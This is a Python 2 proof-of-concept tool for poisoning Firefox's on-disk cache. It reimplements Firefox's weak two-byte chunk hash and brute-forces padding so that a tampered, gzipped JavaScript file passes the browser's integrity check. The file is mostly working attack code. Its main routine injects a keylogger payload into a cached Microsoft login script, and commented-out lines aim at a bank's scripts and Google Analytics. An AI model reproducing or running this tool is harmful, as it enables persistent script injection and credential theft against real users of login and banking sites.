# @Tim leung (e: tleung0504 [at] gmail [dot] com)
# 15/10/2017 
# Slow...... brute forcing hash collision...
# DEMO: https://www.youtube.com/watch?v=QjbkspofFhE
import argparse
import os
import struct
import datetime
import hashlib
import csv
import gzip 
import StringIO 
import zlib
import logging 
import re
import sys
import string
from collections import defaultdict

import random 
from jsmin import jsmin # get some space for payload, rmb to patch it to remove copyright :) hackers dun care about copyright
import time
logging.basicConfig(level=logging.DEBUG, format='%(asctime)s - %(levelname)s - %(message)s')

chunkSize = 256 * 1024 # from source code ~ 262144 bytes, usually pretty safe to assume theres only one two bytes hash

M32 = 0xffffffffL # to deal with the C operation in hashing 
def m32(n):
    return n & M32
def madd(a, b):
    return m32(a+b)
def msub(a, b):
    return m32(a-b)
def mls(a, b):
    return m32(a<<b)

class FFCache(object):
    def __init__(self):
        self.cache2Path = None

    def gunzip(self, data): # for js gzip
        dc = zlib.decompressobj(zlib.MAX_WBITS|32)
        contents = dc.decompress(data)
        return contents

    # just generate a random string to brute force the weak hashing algorithm 
    def randomPaddingGenerator(self, size=6, chars=string.ascii_uppercase + string.digits + string.ascii_lowercase):
        return "%s" % ''.join(random.choice(chars) for _ in range(size))

    def gzip(self, data):
        out = StringIO.StringIO()
        cc = gzip.GzipFile(fileobj=out, mode="wb", filename="", mtime=0)
        cc.write(data)
        cc.close()
        return out.getvalue()

    def setCache2Path(self, cachePath="/home/redback/.cache/mozilla/firefox/fd3mqnds.default/cache2"):
        cache2Path = cachePath
        cache2Path = "/" + cache2Path.strip("/")
        if not os.path.isdir(cache2Path):
            raise Exception("Not a directory")
        if not os.path.isdir("%s/entries" % cache2Path):
            raise Exception("Directory %s/entries Entries folder not found" % cache2Path)
        self.cache2Path = cache2Path
        return True

    def urlToHash(self, url):
        return hashlib.sha1(":" + url).hexdigest().upper()

    def checkState(self, targetUrl):
        if not self.cache2Path:
            raise Exception("Set cachePath first before calling checkState")
        # look up in index 
        indexFile = StringIO.StringIO(open("%s/index" % self.cache2Path, "r").read())
        targetHash = self.urlToHash(targetUrl)

        # copy from index-parser 
        logging.debug('Index File Info')
        indexFileSize = os.path.getsize("%s/index" % self.cache2Path)

        version = struct.unpack('>i', indexFile.read(4))[0]
        lastWrittenInt = struct.unpack('>i', indexFile.read(4))[0]
        dirty = struct.unpack('>i', indexFile.read(4))[0]
        lastWritten = datetime.datetime.fromtimestamp( lastWrittenInt)

        logging.debug("Version - " + str(version))
        logging.debug("LastWritten - " + str(lastWritten))
        logging.debug("Dirty Flag - " + str(dirty))

        # look for target from indexFile
        while indexFileSize - indexFile.tell() > 36 :
            #print "loc: {0}\n".format(indexFile.tell()),
            hash = indexFile.read(20)
            frecency = struct.unpack('>i', indexFile.read(4))[0]
            expireTimeInt = struct.unpack('>i', indexFile.read(4))[0]
            appId = struct.unpack('>i', indexFile.read(4))[0]
            flags = struct.unpack('>B', indexFile.read(1))[0]
            fileSize = struct.unpack('>I', '\x00'+indexFile.read(3))[0]
            if hash == 0 :
                break
            expireTime = datetime.datetime.fromtimestamp(expireTimeInt)

            # weird... not hitting

            if(targetHash == hash.encode('hex').upper()):
                logging.debug("Target found") 
                logging.debug("\thash: {0}h".format(hash.encode('hex')))
                logging.debug("\tfrec: {0}".format(hex(frecency)))
                logging.debug("\texpr: {0}".format(expireTime))
                logging.debug("\tapid: {0}".format(hex(appId)))
                logging.debug("\tflgs: {0}".format(hex(flags)))
                logging.debug("\tsize: {0}".format(fileSize))
                return True
            isMore = fileSize - indexFile.tell()
        return False 

    # can we optimize this? 
    def hashmix(self, a, b ,c): # all uint32_t 
        # this is killing me annoying 
        a = msub(a,b)
        a = msub(a,c)#a - c
        a = a ^ (c>>13)
        b = msub(b,c)#b - c 
        b = msub(b,a)#b - a 
        b = b ^ mls(a,8)
        c = msub(c,a)#c - a
        c = msub(c,b)#c - b
        c = c ^ (b>>13)
        a = msub(a,b)#a - b
        a = msub(a,c)#a - c
        a = a ^ (c>>12)
        b = msub(b,c)#b - c
        b = msub(b,a)#b - a
        b = b ^ mls(a,16)#(a<<16)
        c = msub(c,a) #-= a
        c = msub(c,b) #-= b 
        c ^= (b>>5)
        a = msub(a,b) #-= b
        a = msub(a,c) #-= c
        a ^= (c>>3)
        b = msub(b,c)#-= c
        b = msub(b,a)#-= a
        b = b ^ mls(a,10)#^= (a<<10)
        c = msub(c,a)#-= a
        c = msub(c,b) #-= b
        c ^= (b>>15)
        return (a,b,c)

    #  http://burtleburtle.net/bob/hash/evahash.html
    #  the two bytes hash is formed by hashing the responseData content
    def twoByteHash(self, content):
        # firefox twoBytes hash method for chunk verification 
        # init value is 0 
        a = b = 0x9e3779b9 # golden ratio 
        c = 0 # init value 

        chunkSize = len(content)
        #print "ChunkSize=%d" % (chunkSize)
        cur = 0 
        while chunkSize >= 12:
            (t0,t1,t2,t3) = struct.unpack("BBBB", content[cur:cur+4])
            #print "t0=0x%x t1=0x%x t2=0x%x t3=0x%x" %  (t0,t1,t2,t3)
            cur = cur + 4
            a = madd(a, madd(t0, madd(mls(t1,8), madd(mls(t2,16),mls(t3,24)))))
            (t0, t1,t2,t3) = struct.unpack("BBBB", content[cur:cur+4])
            #print "t0=0x%x t1=0x%x t2=0x%x t3=0x%x" %  (t0,t1,t2,t3)
            cur = cur + 4
            b = madd(b, madd(t0, madd(mls(t1,8), madd(mls(t2,16),mls(t3,24)))))
            (t0, t1,t2,t3) = struct.unpack("BBBB", content[cur:cur+4])
            #print "t0=0x%x t1=0x%x t2=0x%x t3=0x%x" %  (t0,t1,t2,t3)
            cur = cur + 4
            c = madd(c, madd(t0, madd(mls(t1,8), madd(mls(t2,16),mls(t3,24)))))
            (a,b,c) = self.hashmix(a,b,c) 
            chunkSize = chunkSize - 12 
            #print "cur=%d chunkSize=%d" % (cur, chunkSize)

        c = madd(c, len(content))

        try: 
            a = madd(a,(struct.unpack("B", content[cur+0])[0]))
            a = madd(a, mls(struct.unpack("B", content[cur+1])[0], 8))
            a = madd(a, mls(struct.unpack("B", content[cur+2])[0], 16))
            a = madd(a, mls(struct.unpack("B", content[cur+3])[0] , 24))
            b = madd(b, (struct.unpack("B", content[cur+4])[0]))
            b = madd(b, mls(struct.unpack("B", content[cur+5])[0] , 8))
            b = madd(b, mls(struct.unpack("B", content[cur+6])[0], 16))
            b = madd(b, mls(struct.unpack("B", content[cur+7])[0], 24))
            c = madd(c, mls(struct.unpack("B", content[cur+8])[0], 8))
            c = madd(c, mls(struct.unpack("B", content[cur+9])[0], 16))
            c = madd(c, mls(struct.unpack("B", content[cur+10])[0], 24))
        except IndexError: # poor practice , who cares HEHE
            pass
            #print "Completed"
        except :
            print "Error cur=%d chunkSize=%d" % (cur, chunkSize)
            print("Unexpected error:", sys.exc_info()[0])

        (a,b,c) = self.hashmix(a,b,c) # mix again 
        return c & 0xFFFF # completed! 
        # The orginal firefox code
        '''
        CacheHash::Hash32_t
        CacheHash::Hash(const char *aData, uint32_t aSize, uint32_t aInitval)
        {
          const uint8_t *k = reinterpret_cast<const uint8_t*>(aData);
          uint32_t a, b, c, len;

          /* Set up the internal state */
          len = aSize;
          a = b = 0x9e3779b9;  /* the golden ratio; an arbitrary value */
          c = aInitval;        /* variable initialization of internal state */

          /*---------------------------------------- handle most of the key */
          while (len >= 12)
          {
            a += k[0] + (uint32_t(k[1])<<8) + (uint32_t(k[2])<<16) + (uint32_t(k[3])<<24);
            b += k[4] + (uint32_t(k[5])<<8) + (uint32_t(k[6])<<16) + (uint32_t(k[7])<<24);
            c += k[8] + (uint32_t(k[9])<<8) + (uint32_t(k[10])<<16) + (uint32_t(k[11])<<24);
            hashmix(a, b, c);
            k += 12; len -= 12;
          }

          /*------------------------------------- handle the last 11 bytes */
          c += aSize;
          switch(len) {              /* all the case statements fall through */
            case 11: c += (uint32_t(k[10])<<24);  MOZ_FALLTHROUGH;
            case 10: c += (uint32_t(k[9])<<16);   MOZ_FALLTHROUGH;
            case 9 : c += (uint32_t(k[8])<<8);    MOZ_FALLTHROUGH;
            /* the low-order byte of c is reserved for the length */
            case 8 : b += (uint32_t(k[7])<<24);   MOZ_FALLTHROUGH;
            case 7 : b += (uint32_t(k[6])<<16);   MOZ_FALLTHROUGH;
            case 6 : b += (uint32_t(k[5])<<8);    MOZ_FALLTHROUGH;
            case 5 : b += k[4];                   MOZ_FALLTHROUGH;
            case 4 : a += (uint32_t(k[3])<<24);   MOZ_FALLTHROUGH;
            case 3 : a += (uint32_t(k[2])<<16);   MOZ_FALLTHROUGH;
            case 2 : a += (uint32_t(k[1])<<8);    MOZ_FALLTHROUGH;
            case 1 : a += k[0];
            /* case 0: nothing left to add */
          }
          hashmix(a, b, c);

          return c;
        }

        CacheHash::Hash16_t
        CacheHash::Hash16(const char *aData, uint32_t aSize, uint32_t aInitval)
        {
          Hash32_t hash = Hash(aData, aSize, aInitval);
          return (hash & 0xFFFF);
        }
        '''

    def harvestJS(self):
        # find all the JS in the directory
        if not self.cache2Path:
            raise Exception("Set cache2Path before calling harvestJS")

        keys = []
        files = os.listdir("%s/entries/" % self.cache2Path)
        for f in files:
            if re.match("[A-F0-9]{40}", f) :
                #print "Parsing File %s/entries/%s" % (self.cache2Path, f)
                cache = StringIO.StringIO(open("%s/entries/%s" % (self.cache2Path, f), "r").read())
                cache.seek(-4, os.SEEK_END) # find offset 
                metaStart = struct.unpack(">I", cache.read(4))[0]
                #print "metaStart: 0x%x" % metaStart

                numHashChunks = metaStart / chunkSize # calculate the 
                if metaStart % chunkSize :
                    numHashChunks += 1
                cache.seek(metaStart + 4 + numHashChunks*2 , os.SEEK_SET)
                version = struct.unpack('>I', cache.read(4))[0]
                # if version > 1 :
                #     raise Exception("Unsupported version of Firefox")
                fetchCount = struct.unpack('>I', cache.read(4))[0] # its all big endian 
                lastFetchInt = struct.unpack('>I', cache.read(4))[0]
                lastModInt = struct.unpack('>I', cache.read(4))[0]
                frecency = struct.unpack('>I', cache.read(4))[0]
                expireInt = struct.unpack('>I', cache.read(4))[0]
                keySize = struct.unpack('>I', cache.read(4))[0]
                flags = struct.unpack('>I', cache.read(4))[0] if version >= 2 else 0
                key = cache.read(keySize)
                if(key.find(".js") > 0 and key.find(".json") == -1 ):
                    keys.append(key)
        return keys 

    # meaty algo
    def poison(self, targetUrl, payload="console.log('pwned!');", debugPayload=None):
        if not self.cache2Path:
            raise Exception("setCache2Path first before calling poison")
        
        cacheFile = "%s/entries/%s" % ( self.cache2Path, self.urlToHash(targetUrl))
        if not os.path.exists(cacheFile):
            raise Exception("The target %s could not be reached" % cacheFile)

        cache = StringIO.StringIO(open(cacheFile, "r").read())

        # core algorithm 
        cache.seek(-4, os.SEEK_END)
        metaStart = struct.unpack(">I", cache.read(4))[0]
        print "[*] metaStart: 0x%x" % metaStart
        numHashChunks = metaStart / chunkSize # calculate the 
        if metaStart % chunkSize :
            numHashChunks += 1

        if numHashChunks > 1 :
            print "[*] Dangerous! This is a big JS file and more than one chunk is needed"

        cache.seek(0,os.SEEK_SET)
        print("[*] Trying to read 0x%x bytes (metaStart)" % metaStart)
        print("[*] Hash Filename is %s" % self.urlToHash(targetUrl))
        responseData = cache.read(metaStart);
        #print "Current stream position 0x%x " % cache.tell()
        #cache.seek(metaStart + 4 + numHashChunks*2 , os.SEEK_SET)
        # The first 4 byets is the hash of metadata, next 2 byets is the hash of responseData
        (metaDataHash, responseDataHash) = struct.unpack('>IH', cache.read(6)) # no idea what is this heehee, somehow related to 262,144 bytes

        cache.seek(metaStart + 4 + numHashChunks*2 , os.SEEK_SET)
 
        version = struct.unpack('>I', cache.read(4))[0]
        # if version > 1 :
        #     raise Exception("Unsupported version of Firefox")
        fetchCount = struct.unpack('>I', cache.read(4))[0] # its all big endian 
        lastFetchInt = struct.unpack('>I', cache.read(4))[0]
        lastModInt = struct.unpack('>I', cache.read(4))[0]
        frecency = struct.unpack('>I', cache.read(4))[0]
        expireInt = struct.unpack('>I', cache.read(4))[0]
        keySize = struct.unpack('>I', cache.read(4))[0]
        flags = struct.unpack('>I', cache.read(4))[0] if version >= 2 else 0
        key = cache.read(keySize)
        # and the rest is responseHead etc 
        responseHead = cache.read()
        print "[*] Original two bytes responseDataHash 0x%0x" % self.twoByteHash(responseData) 

        print "    version: {0}".format(version)
        print "    fetchCount: {0}".format(fetchCount)
        print "    lastFetch: {0}".format(datetime.datetime.fromtimestamp(lastFetchInt))
        print "    lastMod: {0}".format(datetime.datetime.fromtimestamp(lastModInt))
        print "    frecency: {0}".format(hex(frecency))
        print "    expire: {0}".format(datetime.datetime.fromtimestamp(expireInt))
        print "    keySize: {0}".format(keySize)
        print "    flags: {0}".format(flags)
        print "    key: {0}".format(key)
        print ""

        # from source code...
        emptyChunkHashValue = 0x1826 # MAGIC NUMBER
        # 
        g_data = responseData
        # js files are usually gzzzzzziped
        if responseHead.find("content-encoding: gzip"):
            try:
                p_data = self.gunzip(responseData)
                g_data = p_data
                #print p_data
                #print g_data
                if(g_data.find(payload) > 0):
                    print "[-] Already infected with payload"
                    return False
                # in order to bypass the checking we need to infect it with a ... special thing
                # They used the original metaStart size to check if the file is corrupted 
                # so we have to pad random string until we hit the same hash and 
                # we have to make sure the final size is not too small (?) and 
                # not exceeding the chunk size, otherwise it will break other things

                d=defaultdict(int)
                counter = 0

                b_size = len(p_data)  
                print " * ---------- Preview responseData ---------- *" 
                print p_data[0:2000] if b_size>=2000 else p_data 
                print "-----------------------------------------------"
                print ""

                minified_js = jsmin(p_data)
                a_size = len(minified_js)
                print " * ---------- preview minifiedData ---------- *"
                print minified_js[0:2000] if a_size >= 2000 else minified_js
                print "-----------------------------------------------"
                print ""
                
                if a_size  >= b_size: # this doesnt make sense to me but it does happen, find a better library pls
                    print "[!] WTF? Compressed size (%d) is larger than the original size(%d). minify_js is not doing the work right" % (b_size, a_size)
                    quit()

                size_gained = b_size - a_size 
                print "Size before compression=0x%x(%d) and after=0x%x(%d). Gained 0x%x(%d) bytes" %(b_size, b_size,a_size,a_size,size_gained,size_gained)

                if(len(payload) > size_gained):
                    print "[!] WARNING! Payload (%d bytes) might not fit in" % (len(payload))
                    print "    This is not the end of the world, but the following can happen:"
                    print "    1. The payload might get truncated - BAD"
                    print "    2. gzip compressed it very nicely such that the new payload can fit in (The problem of this is the hash will include the metaData as well "
                    print "       This is going to the TODO list! "
                    print ""
                    
                #size_of_rand_id = b_size - a_size - len(payload) - 4 # 4 bytes for /**/ the commenting 
                #print "[*] Size of random string is 0x%x (%d)" % (size_of_rand_id, size_of_rand_id)
                print "[*] Starting to brute force the hash... Good Luck! :) "
                print "    (This can take some time, let your CPU run, Melbourne's coffee is better!"
                start = time.time()
                generatedCounter=0
                while True: # just keep padding with random string until the gzip matches the twoBytestarget hashes  
                    if debugPayload is not None:
                        print "[*] Using debugging payload"
                        g_data = self.gzip(minified_js+debugPayload)
                        possible_hash1=self.twoByteHash(g_data[:0x28927])
                        #possible_hash2=self.twoByteHash()
                        print "[*] DEBUG: metaStart=0x%x" %metaStart
                        target_hash = self.twoByteHash(g_data[:metaStart])
                        responseDataHash = self.twoByteHash(responseData)
                        print "[*] DEBUG: len=0x%x (%d) responseDataHash=0x%x" %(len(responseData), len(responseData), responseDataHash)
                        print "[*] DEBUG: len=0x%x (%d) target_hash=0x%x" %(len(g_data[:metaStart]), len(g_data[:metaStart]), target_hash)
                        print "[*] DEBUG: len=0x%x (%d) possible_hash1=0x%x" %(len(g_data), len(g_data), possible_hash1)

                        quit()
                    # this is the tricky bit.. The content of the file doesnt really matter
                    # as long as the hash is valid and the number of chuck is what we need 
                    # It will be awesome if the js has a lot of comments, because we can jsut remove part of the comment 
                    # and replace it with our payload
                    # if not we might have to use other way to compress the js file and add ourpayload in, which might affect 
                    # the normal operation of the file

                    # we dun want it to be too small as well, otherwise we have to pad it 
                    # calculate number of chunks here and compare with the previous value 
                    g_data = self.gzip(minified_js+payload+ "<!--" + self.randomPaddingGenerator(5000)) # infect it , the length of the random
                    # string is important... the compressed size of the updated javascript must be greater than the size of the previous js..
                    # However, we cant add too much as well because we dun want to mess up the chunk
                    # chunk size is around 262144 bytes, which is supposed to be a pretty big JS file and very unlikely to hv that size 
                    # so the size gained...
                    generatedCounter+=1
                    ## Create a fake completed file 
                    ## and run the hash on it to include metaData if the new zipped data is slightly smaller 
                    # also check the ifnal file size vs old metaStart, sometimes the compression works too well 
                    # and even after adding the payload, it zipped in to a smaller file than before
                    #  
                    target_hash = self.twoByteHash(g_data[:metaStart]) # change this to use var
                    if d[target_hash] == 0 :
                        counter +=1 
                    sys.stdout.write("[*] Covered hash space 0x%x, generatedCounter=0x%x target_hash=0x%x now=0x%x\r"% (counter, generatedCounter, responseDataHash, target_hash))
                    sys.stdout.flush()
                    d[target_hash] += 1 
                    #print "%x == %x " % (target_hash, responseDataHash)
                    if target_hash == responseDataHash:
                        print "[*] FOUND!!!!!"
                        final_payload = self.gunzip(g_data)
                        print final_payload # the final payload
                        print "[*] Len of the final payload 0x%x (%d)" % (len(final_payload), len(final_payload))
                        payloadSizeDiff = len(final_payload) - metaStart
                        if payloadSizeDiff >= 0:
                            print "[*] Awesome, everything looks fine"
                            print "    1. length of final zipped payload is larger than original zipped payload by 0x%x (%d) bytes" % (payloadSizeDiff, payloadSizeDiff)
                            print "    2. hashes are matching"
                            print ""
                        else:
                            print "[-] Sad beans, compression is doing too well.... we need to increase the random string length"
                        # add assert here to check the new zipped size is >= previous zipped size
                        # if thats the case we probably hv to increase the random string size 

                        # try 5000 on analytics.js 
                        break
                end = time.time()
                print "[*] Brute force completed, time used %fsecs (~%dmins) used" % (end-start, (end-start)/60)
            except Exception as e:
                print e.message
                print "[-] hmmm, shouldnt be not encoded...., just add it, wtever"
                if g_data.find(payload) > 0:
                    print "[-] Already infected with payload"
                    return False
                g_data = g_data + payload
        else:
            if g_data.find(payload)>0:
                print "[-] Already infected with payload"
                return False
            g_data += payload

       
        # recreate the file 
        nr = StringIO.StringIO()
        g_stream_size = len(g_data) # write back to the last 4 bytes
        nr.write(g_data) # ..
        assert(self.twoByteHash(responseData) == responseDataHash)
        assert(self.twoByteHash(g_data[0:metaStart]) == responseDataHash) # important! this is how ff check for integrety 
        nr.write(struct.pack(">IH", metaDataHash, self.twoByteHash(g_data))) # the 4 bytes(hash of metaData) + 2 bytes for g_data hash 
        nr.write(struct.pack(">I", version))
        nr.write(struct.pack(">I", fetchCount)) # fetch count
        nr.write(struct.pack(">I",lastFetchInt))
        nr.write(struct.pack(">I",lastModInt))
        nr.write(struct.pack(">I",frecency))
        nr.write(struct.pack(">I",expireInt))
        nr.write(struct.pack(">I",keySize))
        nr.write(struct.pack(">I",flags))
        nr.write(key) # key will be the same as the url didnt change (not sure if they going to include a null byte)
        # a null byte and then key value pairs 
        nr.write(responseHead[:-4]) # remove the old metaStart
        print "[*] metaStart=0x%x" % (len(g_data))
        nr.write(struct.pack('>I',len(g_data)))

        # content length may be different here 

        # last 4 bytes is definitely different

        newFile = nr.getvalue()
        nr.close()
        cache.close()

        print ("[*] Updating %s" % cacheFile)
        of = open(cacheFile, "wb+")
        of.write(newFile)
        of.close()
        return True # infected


if __name__ == '__main__':
    n = FFCache()
    n.setCache2Path("/home/redback/.cache/mozilla/firefox/fd3mqnds.default/cache2")
    n.harvestJS()

    #if n.checkState("https://www.google-analytics.com/analytics.js"):
    print "[*] Phewwwwwwwwwwww, let the poison begin!"
    #n.poison("https://www.google-analytics.com/analytics.js");
    #n.poison("https://www.commbank.com.au/content/dam/commbank/neo/analytics/clicktale/ctCustomCode.js")
    #n.poison("https://www.commbank.com.au/etc/cloudservices/testandtarget/cba-target-2/_jcr_content/public/mbox.js")
    #n.poison("https://www.google-analytics.com/analytics.js", payload=open('keylogger_228bytes.js').read())
    n.poison("https://auth.gfx.ms/16.000.27549.6/ConvergedLogin_PCore.js", payload=open('keylogger_228bytes.js').read())
    #debugPayload = "console.log('pwned!');<!--IuKY0fnKKLoatnME51bDETfxbCeYqbrWfGVB5u6OwwPPSNkUsqitUUBjC0cKcNlDRSUEKPnwrWvCufUbUdW2VXz7l9sVBXYrzIFz7pwxsU6mBYltzM19GksnH0n37ZV51GaLmsONFuQB3AI1J05A6F6xg97EXRKw89S7Q32iwSKH65c2MTV5vB9wJr9QBJ4ZrRmHmfQtV8j28iTCexMUtczJ1UE6gIqbPIsRmFzWXL0GjHxN6YS09scqdimLEDSp3oNlVMYjO8SSnpfLXEx5IjsKw9RVl83F3JBQpe7SP8FjEv4hX8gJCVpRo1fgjMIpzmxtSe03ii5mduWzAE68OjMZPA4OcAk8iW82GzZHGvkYm4VJfiKPx9l6YTauvpfXIfXiGXg8coFm6jxswqZppGdJ6rq1AL64qzX8cfVLfFZOScRWgvlg6Y4Qg4B3ujyQX72tghnWU31DFY49Ji16Pm58OuTdfsuMKOUPGJ65YetWJ74UX0Eb"
    # above failed because the zipped size... is smaller than the zipped original size.. This can be tricky sometime
    debugPayload=None
    #n.poison("https://r4.res.office365.com/owa/prem/16.1946.26.2421381/scripts/boot.worldwide.2.mouse.js", debugPayload=debugPayload)




